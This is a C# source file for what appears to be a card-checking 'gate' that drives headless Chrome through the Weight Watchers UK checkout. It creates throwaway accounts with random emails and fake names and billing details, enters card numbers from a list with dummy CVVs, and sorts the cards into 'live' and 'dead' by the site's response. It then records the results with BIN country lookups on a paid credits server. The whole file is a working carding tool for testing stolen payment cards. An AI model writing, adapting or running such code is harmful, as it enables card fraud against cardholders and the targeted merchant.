using System;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Threading;
using System.Windows.Forms;
using System.Windows.Forms.VisualStyles;
using gateBeta;
using Newtonsoft.Json;
using OpenQA.Selenium;
using OpenQA.Selenium.Chrome;
using OpenQA.Selenium.Interactions;
using OpenQA.Selenium.Support.Extensions;
using OpenQA.Selenium.Support.UI;
using Keys = OpenQA.Selenium.Keys;

namespace gateDanny.gates
{
    class Weightwatchers
    {
        ChromeDriver driver;
        check check = new check();
        string correo;
        string clave;
        int pagos = 0;
        int numeroTargeta = 1;
        private readonly Random _random = new Random();

        public string checkbin(string bin)
        {
            try
            {
                string jsonString = "";
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create("https://lookup.binlist.net/" + bin);
                request.Method = "GET";
                request.Credentials = CredentialCache.DefaultCredentials;
                ((HttpWebRequest)request).UserAgent = "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)";
                request.Accept = "/";
                request.UseDefaultCredentials = true;
                request.Proxy.Credentials = System.Net.CredentialCache.DefaultCredentials;
                //request.ContentType = "application/x-www-form-urlencoded";
                request.ContentType = "application/x-www-form-urlencoded";
                WebResponse response = request.GetResponse();
                StreamReader sr = new StreamReader(response.GetResponseStream());
                jsonString = sr.ReadToEnd();
                sr.Close();
                //MessageBox.Show(jsonString);
                dynamic cc = JsonConvert.DeserializeObject(jsonString);
                return cc.country.name;
            }
            catch (Exception ex)
            {

                return "Desconocido";
            }

        }

        private string getNum()
        {
            Random obj = new Random();
            string posibles = "0123456789";
            int longitud = posibles.Length;
            char letra;
            int longitudnuevacadena = 9;
            string nuevacadena = "";
            for (int i = 0; i < longitudnuevacadena; i++)
            {
                letra = posibles[obj.Next(longitud)];
                nuevacadena += letra.ToString();
            }
            return nuevacadena;
        }

        public int RandomNumber(int min, int max)
        {
            return _random.Next(min, max);
        }

        private bool tiempoElemento(By by)
        {
            string elemento = "";
            int tiempo = 0;

            while (elemento == "")
            {
                if (tiempo <= 30)
                {
                    if (IsElementPresent(by))
                    {
                        if (driver.FindElement(by).Displayed == true)
                        {
                            elemento = "ok";
                        }
                    }

                }
                else
                {
                    elemento = "Error";
                }
                tiempo++;
            }

            if (elemento != "Error")
            {
                return true;
                //DetailProduct();
            }
            else
            {
                return false;
            }
        }


        public void load()
        {

            check.login(Variables.key);
            if (int.Parse(Variables.creditos) <= 0)
            {
                MessageBox.Show("Recargue sus creditos");
                return;
            }

           
            if (Thunder._Form1.numcc() > 0 && Variables.run == true)
            {

                Thunder._Form1.update_progresbar(5);
                var chromeOptions = new ChromeOptions();
                correo = "joseffernana" + getNum() + "@gmail.com";
                clave = "Jo." + getNum();

                //chromeOptions.AddArguments(new List<string>() { "headless" });
                //chromeOptions.AddArguments("--blink-settings=imagesEnabled=false", "--window-size=1920,1080");, "--headless"
                chromeOptions.AddArguments("--window-size=1920,1080", "--blink-settings=imagesEnabled=false", "--incognito","--headless");

                var chromeDriverService = ChromeDriverService.CreateDefaultService();
                chromeDriverService.HideCommandPromptWindow = true;

                driver = new ChromeDriver(chromeDriverService, chromeOptions);
                driver.Url = "https://www.weightwatchers.co.uk/checkout/plan?st=digital&_ga=2.48880879.877013683.1596268142-1277442353.1596268142";
                Thread.Sleep(1000);
                correo = "joseffernana" + getNum() + "@hotmail.com";


                try
                {
                    if (tiempoElemento(By.Id("didomi-notice-agree-button")))
                    {
                        driver.FindElementById("didomi-notice-agree-button").Click();
                        Thread.Sleep(1000);
                        if (tiempoElemento(By.Id("plan-0-btn")))
                        {
                            Thunder._Form1.update_progresbar(20);
                            driver.FindElementById("plan-0-btn").Click();
                            Thread.Sleep(1000);
                            if (tiempoElemento(By.Id("first-name")))
                            {
                                Thunder._Form1.update_progresbar(60);
                                driver.FindElementById("first-name").SendKeys("DAVID");
                                Thread.Sleep(500);
                                driver.FindElementById("last-name").SendKeys("REYES");
                                Thread.Sleep(500);
                                driver.FindElementById("email").SendKeys(correo);
                                Thread.Sleep(500);
                                driver.FindElementById("password").SendKeys(clave);
                                Thread.Sleep(500);
                                driver.FindElementByXPath("//*[@id='newsletter-option-label']/span").Click();
                                Thread.Sleep(500);
                                driver.FindElementByXPath("//*[@id='is-acknowledged-label']/span").Click();
                                Thread.Sleep(1000);
                                driver.FindElement(By.Id("next-step-btn")).Click();
                                Thread.Sleep(1000);
                                if (tiempoElemento(By.Id("credit-card-number")))
                                {
                                    pago();
                                }
                                else
                                {
                                    restart();
                                }

                            }
                            else
                            {
                                restart();
                            }
                        }
                        else
                        {
                            restart();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                catch (Exception ex)
                {
                    if (Variables.run == true)
                    {
                        restart();
                    }
                    else
                    {
                        stop();
                    }

                }

            }
            else
            {
                stop();
            }
        }


        private bool IsElementPresent(By by)
        {
            try
            {
                Thread.Sleep(1000);
                driver.FindElement(by);
                return true;
            }
            catch (NoSuchElementException)
            {
                return false;
            }
        }

        private void restart()
        {
            try
            {
                pagos = 0;

                driver.Close();
                driver.Quit();
                load();
            }
            catch (Exception)
            {


                pagos = 0;
                driver.Quit();
                load();
            }

        }

        private void pago()
        {
            try
            {
              


                if (Thunder._Form1.numcc() > 0 && Variables.run == true)
                {
                    if (pagos < 10)
                    {
                        Thunder._Form1.update_progresbar(80);

                        string cc = Thunder._Form1.nextCc();
                        string[] ccLine = cc.Split('|');
                        var ccnum = ccLine[0];

                        if (tiempoElemento(By.Id("credit-card-number")))
                        {
                            driver.FindElementById("credit-card-number").SendKeys(ccnum);
                            Thread.Sleep(500);
                            driver.FindElementById("cc-expiration-date").SendKeys(ccLine[1]);
                            Thread.Sleep(200);
                            driver.FindElementById("cc-expiration-date").SendKeys(ccLine[2].Remove(0, 2));
                            Thread.Sleep(200);
                            if (ccLine[3].Trim().Length == 3)
                            {
                                driver.FindElement(By.Id("cvv")).SendKeys(("000"));
                            }

                            if (ccLine[3].Trim().Length == 4)
                            {
                                driver.FindElement(By.Id("cvv")).SendKeys(("0000"));
                            }



                            Thread.Sleep(2000);
                            if (pagos == 0)
                            {
                                Thread.Sleep(200);
                                driver.FindElement(By.XPath("//*[@id='billing-address-line-1']")).SendKeys("street 78" + RandomNumber(1, 99));
                                Thread.Sleep(500);
                                driver.FindElement(By.Id("billing-city")).SendKeys("LONDON");
                                Thread.Sleep(500);
                                driver.FindElement(By.Id("billing-postal-code")).SendKeys("N17 9EZ");
                                Thread.Sleep(500);
                                driver.FindElement(By.Id("phone-number")).SendKeys("213547" + RandomNumber(1000, 9999).ToString());
                                Thread.Sleep(500);
                                Thread.Sleep(1000);
                                driver.FindElementByXPath("//*[@id='payment-address']/div[4]/div[1]/div/button").Click();
                                Thread.Sleep(1000);
                                driver.FindElement(By.XPath("//*[@id='-2']")).Click();
                                Thread.Sleep(2000);


                                //var country = new SelectElement(driver.FindElementById("billing-state"));
                                //country.SelectByIndex(2);
                               
                            }

                            driver.FindElement(By.Id("next-step-btn")).Click();
                            Thread.Sleep(1000);
                            driver.FindElement(By.Id("next-step-btn")).Click();

                            if (tiempoElemento(By.Id("next-step-btn")))
                            {
                                driver.FindElement(By.XPath("//*[@id='user-checkboxes']/div/div/label")).Click();
                                Thread.Sleep(500);
                                driver.FindElement(By.Id("next-step-btn")).Click();
                                Thread.Sleep(5000);
                            }
                            else
                            {
                                restart();
                            }

                        }
                        else
                        {
                            restart();
                        }


                        Thunder._Form1.update_progresbar(95);

                        if (confirmar())
                        {
                            Thunder._Form1.update_progresbar(100);
                            var pais = checkbin(cc.Substring(0, 6));
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "lives");
                            Thunder._Form1.agrgar_live(" ** APROVADO ** - " + cc + " - " + pais);
                            check.playlive();
                            Console.WriteLine("live " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            restart();
                        }
                        else
                        {
                            var pais = checkbin(cc.Substring(0, 6));
                            Thunder._Form1.update_progresbar(100);
                            var guardar = numeroTargeta + " - " + cc + " - " + pais + " " + Variables.gate;
                            check.ccss(Variables.key, guardar, "deads");
                            Thread.Sleep(300);
                            Thunder._Form1.agragar_dead(cc);
                            Console.WriteLine("dead " + numeroTargeta + " - " + cc + " - " + correo + " - " + clave);
                            Thunder._Form1.remove_cc(0, cc.Length);
                            numeroTargeta++;
                            pagos++;
                            pago();
                        }
                    }
                    else
                    {
                        restart();
                    }
                }
                else
                {
                    stop();
                }
            }
           catch (Exception ex)
            {
                //MessageBox.Show(ex.ToString());
                if (Variables.run == true)
                {
                    restart();
                }
                else
                {
                    return;
                    stop();
                }

            }

        }

        public void stop()
        {
            try
            {
                pagos = 0;
                numeroTargeta = 0;
                driver.Close();
                driver.Quit();
            }
            catch (Exception ex)
            {

                Console.WriteLine(ex.ToString());
            }
            
        }

        public bool confirmar()
        {
            string estado = "";
            bool resp = false;

            int tiempo = 0;

            while (estado == "")
            {

                if (tiempo < 30)
                {



                    if (IsElementPresent(By.XPath("//*[@id='card-failure-modal']/div[1]/span")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='card-failure-modal']/div[1]/span")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='card-failure-modal']/div[1]/span")).Text.Trim() != "")
                            {
                                estado = "dead";
                            }
                        }
                    }

                    if (IsElementPresent(By.XPath("//*[@id='confirmation']/div[2]/div[3]/div[1]/div/h2")))
                    {
                        if (driver.FindElement(By.XPath("//*[@id='confirmation']/div[2]/div[3]/div[1]/div/h2")).Displayed == true)
                        {
                            if (driver.FindElement(By.XPath("//*[@id='confirmation']/div[2]/div[3]/div[1]/div/h2")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }


                    if (IsElementPresent(By.Id("confirmationCallToAction")))
                    {
                        if (driver.FindElement(By.Id("confirmationCallToAction")).Displayed == true)
                        {
                            if (driver.FindElement(By.Id("confirmationCallToAction")).Text.Trim() != "")
                            {
                                estado = "live";
                            }
                        }
                    }



                }
                else
                {
                    estado = "error";
                }

                tiempo++;
            }



            if (estado == "dead")
            {

                driver.FindElement(By.Id("modalBtnId")).Click();
                Thread.Sleep(1000);



                return false;
            }

            if (estado == "live")
            {
                return true;
            }

            if (estado == "error")
            {
                restart();
                return false;
            }

            return false;

        }



        public static DialogResult InputBox(string title, string promptText, ref string value)
        {
            Form form = new Form();
            Label label = new Label();
            TextBox textBox = new TextBox();
            Button buttonOk = new Button();
            Button buttonCancel = new Button();

            form.Text = title;
            label.Text = promptText;
            textBox.Text = value;

            buttonOk.Text = "OK";
            buttonCancel.Text = "Cancel";
            buttonOk.DialogResult = DialogResult.OK;
            buttonCancel.DialogResult = DialogResult.Cancel;

            label.SetBounds(9, 20, 372, 13);
            textBox.SetBounds(12, 36, 372, 20);
            buttonOk.SetBounds(228, 72, 75, 23);
            buttonCancel.SetBounds(309, 72, 75, 23);

            label.AutoSize = true;
            textBox.Anchor = textBox.Anchor | AnchorStyles.Right;
            buttonOk.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
            buttonCancel.Anchor = AnchorStyles.Bottom | AnchorStyles.Right;

            form.ClientSize = new Size(396, 107);
            form.Controls.AddRange(new Control[] { label, textBox, buttonOk, buttonCancel });
            form.ClientSize = new Size(Math.Max(300, label.Right + 10), form.ClientSize.Height);
            form.FormBorderStyle = FormBorderStyle.FixedDialog;
            form.StartPosition = FormStartPosition.CenterScreen;
            form.MinimizeBox = false;
            form.MaximizeBox = false;
            form.AcceptButton = buttonOk;
            form.CancelButton = buttonCancel;

            DialogResult dialogResult = form.ShowDialog();
            value = textBox.Text;
            return dialogResult;
        }


    }
}

